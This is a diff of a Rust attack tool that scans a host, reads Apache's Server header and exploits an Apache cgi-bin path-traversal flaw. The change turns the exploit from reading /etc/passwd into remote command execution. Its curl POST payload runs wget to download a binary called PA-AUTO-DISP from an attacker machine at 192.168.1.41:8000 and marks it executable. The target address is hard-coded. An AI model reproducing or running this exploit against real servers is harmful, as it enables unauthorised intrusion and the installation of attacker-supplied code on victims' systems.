@@ -1,8 +1,12 @@
-use std::net::TcpStream;
+use std::error::Error;
+use std::io;
+use std::net::{SocketAddr, TcpListener, TcpStream};
 use std::process::{Command, Output};
+use regex::Regex;
 use reqwest;
-use reqwest::{RequestBuilder, Url};
-use reqwest::{blocking::Client, header};
+use reqwest::{Client, RequestBuilder, Url};
+use reqwest::{header};
+use tokio::io::{AsyncBufReadExt, BufReader};
 
 fn ping_ip(ip_address: &str) -> Result<(), String> {
     let command = Command::new("ping")
@@ -36,25 +40,34 @@ fn scan_ports(target_ip: &str) {
 
 
 
-pub fn get_apache_headers(target_url: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let client = Client::new();
 
-    let res = client.get(target_url)?
-        .header(header::HOST, target_url)
-        .send()?;
 
-    for (name, value) in res.headers().iter() {
-        println!("{}: {}", name, value);
+pub async fn get_apache_headers(target: String) -> Result<(), reqwest::Error> {
+    let url = format!("http://{}", target);
+    let client = reqwest::Client::new();
+    let res = client.get(&url).send().await?;
+
+    if let Some(server) = res.headers().get("Server") {
+        println!("Server: {:?}", server);
+    } else {
+        println!("Server header not found");
     }
 
     Ok(())
 }
 
+
+
 async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", target_ip);
+    let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
+    let srv:String = format!("192.168.1.41");
+
     let command_output: Output = Command::new("curl")
         .arg("-X")
         .arg("POST")
+        .arg("-d")
+        .arg(format!("echo; cd /tmp && wget http://{}:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP", srv))
+        //.arg("echo;id")
         .arg(url)
         .output()
         .map_err(|e| format!("Failed to execute command: {}", e))?;
@@ -69,6 +82,7 @@ async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error
     }
 }
 
+#[tokio::main]
 async fn main() {
     let ip_address = "192.168.1.122";
     let url = format!("http://{}",ip_address);
@@ -79,5 +93,5 @@ async fn main() {
     //}
     //exploit_apache(ip_address).await.expect("TODO: panic message");
 
-    get_apache_headers(url);
+    //get_apache_headers(ip_address.to_string()).await;
 }
